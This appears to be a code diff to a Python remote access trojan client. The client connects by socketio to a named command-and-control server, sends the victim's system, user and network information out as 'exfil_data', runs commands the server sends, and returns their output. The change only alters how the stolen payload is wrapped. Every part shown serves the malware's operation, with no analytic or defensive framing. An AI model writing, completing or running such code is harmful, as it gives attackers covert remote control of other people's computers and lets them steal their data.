@@ -9,7 +9,7 @@ from socketio import Client
 import netifaces
 
 # Server settings
-SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL
+SERVER_URL = "https://c2-backend-wily.onrender.com"
 
 def get_system_info():
     """Gather system information including username, compatible with Linux and Windows."""
@@ -87,7 +87,7 @@ def main():
                 "network": network_info,
                 "type": "system_info"
             }
-            sio.emit('exfil_data', json.dumps(exfil_data))
+            sio.emit('exfil_data', {'data': json.dumps(exfil_data)})  # Explicit data key
             print("[*] Exfiltrated data sent to RAT server")
 
         @sio.event
@@ -107,12 +107,12 @@ def main():
                 return
             output = execute_command(data)
             print(f"[*] Executed command: {data}")
-            sio.emit('exfil_data', json.dumps({
+            sio.emit('exfil_data', {'data': json.dumps({
                 "type": "command_output",
                 "command": data,
                 "output": output,
                 "current_dir": os.getcwd()
-            }))
+            })})  # Explicit data key
 
         while True:
             try:
